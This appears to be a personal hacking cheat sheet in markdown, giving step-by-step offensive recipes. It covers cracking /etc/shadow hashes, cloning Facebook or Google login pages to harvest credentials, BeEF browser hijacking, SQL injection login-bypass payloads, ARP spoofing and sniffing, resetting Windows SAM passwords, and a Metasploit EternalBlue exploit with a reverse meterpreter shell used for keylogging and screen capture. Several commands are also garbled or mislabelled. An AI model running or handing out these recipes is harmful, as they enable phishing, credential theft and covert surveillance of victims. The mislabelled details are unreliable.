# ---- [ HACKS ] ----
                        
        [../index.md]

## FIREFOX NETWORK PROXY CONFIGURATION
   Open settings dialog/ in search bar type xy

## BURPSUITE
   Go to Proxy/intercept
   Open Browser and enter URL.
   Click Forward to accept request
   Click Drop to drop request

## WIRESHARK
   
## TOOLS
   Termshark                  git https://github.com/gcla/termshark
   openVPN                 

## HASHCAT
* CRACK HASH in /etc/shadow
* CREATE SHA256 HASH IN COMMAND LINE
   echo -n "foobar" | sha256sum

* USING OPENSSL
   echo -n "foobar" | openssl dgst -sha256
   
   > Other algorythm
      -md4 , -md5
      -ripemd160
      -sha,-sha1,sha384,-sha512,whirlpool

`crsohe:$y$j9T$sQkXPBAQFZdEsbkSsukEI0$g.H2of1Km3C3XSaMF.pLUxCIwFjM2agLbQ7w35X4zlD:18994:0:99999:7:::`

   `$y$`: means SHA512
   j9T is a SALT

* Get Information about hashing function
   grep -A 18 ENCRYPT_METHOD /etc/login.defs

* GET THE CORRECT HASH
   hashid $y$j9T$sQkXPBAQFZdEsbkSsukEI0$g.H2of1Km3C3XSaMF.pLUxCIwFjM2agLbQ7w35X4zlD/
   > output: H2of1Km3C3XSaMF.pLUxCIwFjM2agLbQ7w35X4zlD
   [+] cisco Type 4

* CRACK:
   hashcast  -a 0 -m 5700 -o found_pass.txt $y$j9T$sQkXPBAQFZdEsbkSsukEI0$g.H2of1Km3C3XSaMF.pLUxCIwFjM2agLbQ7w35X4zlD/ wordlist.txt

## NMAP 
     -Pn → No ping → nmap -Pn -p443

   All scripts are located on /usr/share/nmap/scripts
   * SCAN ALL ROUTER TO SEE WHERE USE NETWORK
      nmap -sn 192.168.1.0/24    sn = Disable port scan

   * SCAN IP USING VULN SCRIPT TO SEARCH VULNERABILITY
 	     nmap -A --script vuln <ip>
   * BYPASS FIREWALL FOR SCAN
     nmap -sS -v -v -Pn ip

   * SHOW OS RUNNING ON HOST 
      nmap -sV 192.168.1.67

   * SHOW STATE/SERVICE/REASON
      nmap -vv 

   * SCAN TO SEE IF WEBSERVER USE FIREWALL(Web Application Firewall DETECTION)
      nmap -p80 --script http-waf-detect www.loiloylang.com

   * DETECT TYPE AND VERSION OF FIREWALL
      nmap -p80 --script http-waf-fingerprint www.loiloylang.com

## SETTOOLKIT
* CREATE A FB OR GOOGLE ACCOUNT LOGIN PAGE
 1. settoolkit then select 
   1) Social-Engineering-attack 
   2) Website attack vector
   3) Credential Harvester Attack Method
      → 2) site cloner
      Enter IP of server for the result
      Enter the webpage to clone
2. Connect to 192.168.1.65
3. Enter login & page 
4. Get the credential.

## BEEF-XSS (BROWSER EXPLOITATION)
   login: beef
   pass: vm10

* HOW ITS WORK
   run beef and connect your browser to http://127.0.0.1:3000/demos/basic.html
   or to your WEBSITE

* DETECT IF THE BROWSER IS CONNECTED TO SOCIAL NETWORKS
    Commands and search social in module tree

* ATTACK FACEBOOK POPUP
   Go to pretty Theft Section and generate FB TimeOut Session

## SQL INJECTION(STRUCTURE QUERY LANGUAGE)
   SELECT:           Retrieve data
   DROP:             Delete table
   INSERT:           Add row to table
   UPDATE:           Modify row in table
   DELETE:           Remove row from table
   -- COMMENTS:      DASH SPACE in front

  * Sanitization means cleaning 

         http://newpaper.com/item.php?id=2

   1. The URL above send the folowing query to the database
```sql
         SELECT title, description, body FORM
         items WHERE ID=2
```

   2. The attacker inject a query that returns 'false':  
         http://newspaper.com/item.php?id=2 and 1=2

      Now the query looks like 
```sql
      SELECT title, description, body from
      items WHERE ID=2 and 1=2
```

   3. send a query that returns TRUE
         http://newspaper.com/item.php?id=2 and 1=1

   If the content that returns TRUE is different that the page 
   whose returns FALSE then the attacker is able to distinguish
   when the executed query returns TRUE or FALSE

### LOGIN TRICKS
```sql
   admin'--
   admin'#
   admin'/*
   'or 1=1--
   'or 1=1#
   'or 1=1/*
   ') or'1'='1--
   ') or ('1'='1--
```

## BETTERCAP[WIFI TOOL]
* RUN PROBE MODULE(RUN THIS CMD TO SHOW ENTIRE NETWORK)
   net.probe show

* SHOW INTERFACE WITH INFO
   net.show

* ATTACK TARGET
   set arp.spoof.targets <ip>

* RUN ARP MODULE
   arp.spoof on

* ENABLE SNIFFING
   set net.sniff.verbose true
   net.sniff on

## RECON-NG[GATHERING INFORMATION]
   `marketplace`                                                  Show all modules
   `marketplace search hackertarget`                              Search path for module
   `marketplace install recon/domains-hosts/hackertarget`         Install hackertarget module
   `modules search`                                               Show modules installed
   `modules load recon/domains-hosts/hackertarget`                Load module
   `options set SOURCE loiliangyang.com`                          Set TARGET
   `run`                                                          Run ATTACK
   `back`                                                         Go back in step

### MODULES
   hackertarget         Show information about WEBSITE / IP
   interesting_files   
         All files download are located in ~/.recon-ng/workspaces/default

## MALTEGO[GATHERING INFORMATION]
   Give all information about WEBSITE(openSSL/openSSH/OS...)

## SHA (SECURE HASH ALGORITHM)
   * Generate Checksum
         sha256sum <file.iso>

   * Compare the two value 
        sha256sum -c <SHA256SUM>

## OPENVPN
   apt-get install openvpn

### NIKTO (WEBSITE VULNERABILITY SCANNER)
	nikto -h http://ip

## HACK ON LINUX
  Open File without permission
        1. ` while read $file; do echo "$file"; done < "/etc/passwd" `

# ---- [ WINDOWS HACKING ] ----

   1. Run Kali linux and go to:   `Windows/System32/config/`
      * `chntpw -l SAM`                                                 List All users on machine
      * `chntpu -u <user> SAM`                                          Modify PASS

   * WINDOWS COMMAND
      arp -a                     Show all IP with STATIC/DYNAMIC IP adresses 

      net view /all              Show all machines connected on networks

## HACKING WEBCAM 
	1. Get Network information
		ip -4 addr show				Show information about LAN
	2. Scan Network to show All hosts
      		  192.168.1.53	(Zallman)
		        192.168.1.60	(SamsungTV)
		        192.168.1.65	(PopoPC)
		        192.168.1.254	(BBox)
	3. Ethercap(MITM)
		Option > Targets 
			Puts routers Target1
			target in Target2
			Run ARP Poisoning

## METASPLOIT[TOOL TO EXPLOIT MICROSOFT]
* KEYLOG 
  > msfconsole 
  > search eternal 
  > use exploit/windows/smb/ms17_010_psexec
  > set payload windows/x64/meterpreter/reverse_http
  > show options 
  > set LHOST 192.168.0.100 (your IP address)
  > set RHOSTS 192.168.0.185 (WINDOWS IP address)
  > exploit

  > ps (List all processes inside the machine)
  > sysinfo (Show system information) 
  > migrate 5924 (Process ID of OneDrive)
  > keyscan_start
  > keyscan_dump ( List all login/ pass used


* SCREEN SHARING
    Do Five first task
    > ps (List all processes)
    > migrate 6068 (Process ID of OneDrive)
    > screenshare

